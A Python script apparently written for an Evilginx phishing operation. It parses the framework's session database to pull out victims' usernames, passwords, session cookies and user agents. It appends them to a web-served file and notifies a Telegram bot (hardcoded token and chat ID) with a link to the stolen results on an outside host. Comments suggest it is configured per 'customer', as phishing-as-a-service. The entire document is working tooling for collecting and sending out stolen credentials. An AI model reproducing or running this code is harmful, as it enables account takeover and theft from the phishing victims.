file_path = '/root/.evilginx/data.db'
#EDIT this for costomer receive cookies /var/www/html/<costomer-site-name-for-ues>.txt
file_useano="/var/www/html/qSbBMzMq.txt"
#EDIT this to not rerecive cookies /var/www/<costomer-site-name-for-ues>-cozer.txt
file_copypresent='/var/www/html/cozerqSbBMzMq.txt'
file_content1=""
file_content2=''
file_content3=''
totalline=0
totalline2=0
message=''
username=''
password=''
tokens=''
useragent=''
createtime=''
updatetime=''
sovic=""
toappendtext=""
pchecktokens="12"
pcheckpassword="12"



TOKEN='6579196085:AAHPWo16Q_scDH5m_A4iQlz4O7REfmokMws'
CHAT_ID='1901733279'


import requests
import re
import datetime

current_time = datetime.datetime.now()

with open(file_path, 'r') as fp:
    for totalline, line in enumerate(fp):
        pass

with open(file_copypresent, 'r') as fp:
    for totalline2, line in enumerate(fp):
        pass

file=open(file_path, 'r')
file_content11 = file.read() 
file.close()

with open(file_useano, 'r') as file:
    file_content2 = file.read()
    file.close()

file=open(file_path, 'r')
file_content1 = file.readlines() 

filer=open(file_copypresent,"r")
file_content3=filer.read()


count = 0
cutpassword=''
cookiechecker=''
p2qSbBMzMq=0


for line in file_content1:
    count += 1
    if count>totalline2 and totalline+1 != totalline2+1:
        m = re.search('"password":"(.+?)","custom":', line.strip())
        if m:cutpassword=m.string.strip('"password":"''","custom":')  
        cok = re.search('"tokens":{(.+?)},"session_id":', line.strip())
        if cok:
            vosd=cok.group(1)
            cookiechecker=vosd.strip('"tokens":''"session_id":') 
        #LINE TO ADD
        if "qSbBMzMq" in line.strip():
            if cookiechecker != '"tokens":{},"session_id"' and 'true' in cookiechecker and pchecktokens != tokens:
                p2qSbBMzMq=+1
                user=re.search('"username":"(.+?)"password":', line.strip())
                if user:
                   bolit=user.group(1)
                   username=bolit.strip('"username":"''"password":')
                passw=re.search('"password":"(.+?)","', line.strip())
                if passw:
                   voliw=passw.group(1)
                   password=voliw.strip('"password":"''","') 
                toks=re.search('"tokens":(.+?)"session_id":', line.strip())
                if toks:
                   tokax=toks.group(1)
                   tokens=tokax.strip('"tokens":''"session_id":') 
                   #this is the tokens checker to change to customer p(number)checktokens
                   pchecktokens=tokens
                useage=re.search('"useragent":"(.+?)","', line.strip())
                if useage:
                   koila=useage.group(1)
                   useragent=koila.strip('"useragent":"''","') 
                #change file destination to create file '/var/www/html/(customer end lures).txt'
                with open(file_useano, 'a') as file:
                 toappendtext=current_time.strftime("%d-%b-%Y (%H:%M:%S.%f)")+'\n'+'\n'+"YOU HAVE A NEW RESULT"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies:"+tokens+'\n'+'\n'
                 file.write(toappendtext)
                 file.close()
            elif  ',"password":"",' in line.strip():
                  life="DON'T DO SHIT"
            elif cutpassword != '' and password != pcheckpassword:
                p2qSbBMzMq=+1
                user=re.search('"username":"(.+?)"password":', line.strip())
                if user:
                   bolit=user.group(1)
                   username=bolit.strip('"username":"''"password":')
                passw=re.search('"password":"(.+?)","', line.strip())
                if passw:
                   voliw=passw.group(1)
                   password=voliw.strip('"password":"''","') 
                   #this is the password checker to change to customer p(number)checkpassword
                   pcheckpassword=password
                useage=re.search('"useragent":"(.+?)","', line.strip())
                if useage:
                   koila=useage.group(1)
                   useragent=koila.strip('"useragent":"''","') 
                #change file destination to create file '/var/www/html/(customer end lures).txt'
                with open(file_useano, 'a') as file:
                 toappendtext=current_time.strftime("%d-%b-%Y (%H:%M:%S.%f)")+'\n'+'\n'+"YOU HAVE A NEW RESULT"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies:"+tokens+'\n'+'\n'
                 file.write(toappendtext)
                 file.close() 
                cutpassword=''

if count ==  totalline+1:
       with open(file_copypresent, 'w') as file:
         file.write(file_content11)
         file.close()
         message=''
         username=''
         password=''
         tokens=''
         useragent='' 


if p2qSbBMzMq>0:
    message="YOU HAVE A NEW RESULT"+'\n'+"CLICK THE LINK TO VIEW LOGIN AND COOKIES"+'\n'+'http://results.0ma.site/qSbBMzMq.txt'
    url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
    requests.get(url)